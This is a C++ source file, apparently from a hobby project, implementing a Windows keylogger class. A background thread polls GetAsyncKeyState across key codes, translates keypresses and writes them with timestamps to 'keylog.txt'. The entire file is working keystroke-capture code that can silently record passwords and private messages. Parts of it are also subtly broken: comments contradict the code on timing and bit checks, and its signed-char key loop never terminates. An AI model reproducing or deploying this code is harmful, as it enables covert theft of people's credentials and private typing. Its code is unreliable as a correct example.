//
// Created by actua on 5/21/2024.
//

#include <iostream>


#include <thread>
#include <windows.h>
#include "../include/FileHandler.h"
#include "../include/Keylog.h"

KeyLog::KeyLog(const std::string &fname = "keylog.txt") : keyHandler(fname), running(true), fileHandler(fname) {}

// Log the key to the file
/**
 * create a thread
 */
void KeyLog::start() {
  logthread = std::thread(&KeyLog::logLoop, this);
}

// check if thread is joinable which blocks until finishing execution
void KeyLog::stop() {
  running = false;
  if (logthread.joinable()) {
    logthread.join();
  }
}

// logloop to print out some keys when i am typing

void KeyLog::logLoop() {
  // initialize last keypress time
  auto lastKeypress = std::chrono::system_clock::now();
  std::string sequence;

  while (running) {
    // Check each key
    for(char c = 8; c <= 190; c++) {
      // If the key is pressed, the most significant bit is set
      if (GetAsyncKeyState(c) & 0x1) {
        // Translate the key into a string for logging
        const std::string k = Key::translateKey(c);
        sequence += k;
        lastKeypress = std::chrono::system_clock::now();
      }
    }

    // only append logs if the last keypress was longer than 10 seconds
    auto now = std::chrono::system_clock::now();
    if (const auto timeDelta = std::chrono::duration_cast<std::chrono::seconds>(now - lastKeypress).count();
        timeDelta >= 5 && !sequence.empty()) {
      std::time_t time = std::chrono::system_clock::to_time_t(now);
      std::stringstream tss;
      tss << std::put_time(std::localtime(&time), "%Y-%m-%d %X");
      std::string timeStr = tss.str();
      // append the time to the sequence
      sequence += " " + timeStr + "\n";
      fileHandler.write(sequence);
      sequence.clear();
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(10));
  }
}
